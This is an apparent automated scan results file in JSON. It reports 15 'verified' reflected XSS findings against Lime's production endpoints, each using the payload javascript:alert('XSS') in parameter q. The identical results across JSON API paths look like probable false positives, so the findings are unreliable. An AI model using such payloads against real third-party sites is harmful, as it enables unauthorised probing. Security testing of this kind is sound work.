@@ -1,0 +1,158 @@
+{
+  "timestamp": "2025-10-20T13:33:09.302581",
+  "test_type": "multi_target_hunting",
+  "targets_tested": 98,
+  "findings": [
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/admin",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/search",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/v2/",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/login",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/users",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/user",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/token",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/v1/",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/auth",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/account",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/graphql",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/rest/api/",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/profile",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "target": "Lime",
+      "endpoint": "https://www.li.me/api/settings",
+      "parameter": "q",
+      "payload": "javascript:alert('XSS')",
+      "verified": true,
+      "description": "Reflected XSS via q - unescaped HTML injection"
+    }
+  ],
+  "total_findings": 15
+}
